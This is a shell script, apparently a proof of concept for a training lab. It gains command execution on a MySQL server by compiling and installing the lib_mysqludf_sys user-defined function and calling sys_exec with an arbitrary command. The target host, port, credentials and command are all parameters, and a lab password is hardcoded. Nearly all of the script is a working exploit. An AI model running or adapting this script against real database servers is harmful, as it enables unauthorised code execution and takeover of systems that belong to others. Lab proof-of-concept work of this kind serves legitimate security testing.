#!/bin/sh
# udf-rce.sh - end-to-end UDF RCE PoC for the Osede Kommun lab.
#
# Compiles lib_mysqludf_sys.c, installs it as a MySQL UDF via the
# low-privilege app account, executes a command inside the mysqld
# process, then cleans up.
#
# Usage: poc/udf-rce.sh [host] [port] [user] [pass] [command]
#   defaults: 127.0.0.1 3307 osede_app OseDe2026app "id > /tmp/osede_pwned"

set -e

HOST=${1:-127.0.0.1}
PORT=${2:-3307}
DBUSER=${3:-osede_app}
DBPASS=${4:-OseDe2026app}
CMD=${5:-"id > /tmp/osede_pwned"}

ROOT=$(cd "$(dirname "$0")/.." && pwd)
MYSQL="$ROOT/runtime/mysql/root/bin/mysql"
SO=/tmp/lib_mysqludf_sys.so
export LD_LIBRARY_PATH="$ROOT/runtime/mysql/extra-libs${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}"

sql() {
  out=$("$MYSQL" -h"$HOST" -P"$PORT" -u"$DBUSER" -p"$DBPASS" osede_db -e "$1" 2>&1) || { echo "$out"; return 1; }
  printf '%s\n' "$out" | grep -v "Using a password on the command line interface can be insecure" || true
}

echo "[*] dropping old function (if any)"
sql "DROP FUNCTION IF EXISTS sys_exec;"

echo "[*] compiling UDF shared object"
PLUGIN_DIR="$ROOT/runtime/mysql/root/lib/plugin"
gcc -shared -fPIC -o "$SO" "$ROOT/poc/lib_mysqludf_sys.c"
cp "$SO" "$PLUGIN_DIR/lib_mysqludf_sys.so"

echo "[*] installing UDF (osede_app has ALL PRIVILEGES + FILE, secure-file-priv is empty)"
sql "CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so'"

echo "[*] executing: sys_exec('$CMD')"
sql "SELECT sys_exec('$CMD');"

if [ -f /tmp/osede_pwned ]; then
  echo "[+] command output (from /tmp/osede_pwned):"
  cat /tmp/osede_pwned
else
  echo "[!] /tmp/osede_pwned not found - command may not have run"
fi

echo "[*] cleanup"
sql "DROP FUNCTION IF EXISTS sys_exec;"
rm -f "$SO" "$PLUGIN_DIR/lib_mysqludf_sys.so" /tmp/osede_pwned
echo "[+] done"
